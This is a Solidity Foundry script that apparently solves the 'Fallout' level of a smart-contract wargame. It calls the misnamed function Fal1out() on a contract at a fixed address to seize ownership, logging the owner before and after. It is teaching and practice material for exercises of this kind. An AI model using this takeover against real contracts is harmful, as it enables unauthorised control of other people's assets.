// SPDX-License-Identifierr: MIT
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {Fallout} from "../src/level2/Fallout.sol";
import "forge-std/console.sol";

contract level2Exploit is Script {
    Fallout fallout = Fallout(0x0D7eEB0B2799bBD9912Cc7Dc32a114cE9b0Cfbb2);

    function run() external {
        vm.startBroadcast();
        console.log("owner: ", fallout.owner());
        fallout.Fal1out();

        console.log("owner: ", fallout.owner());
        vm.stopBroadcast();
    }
}
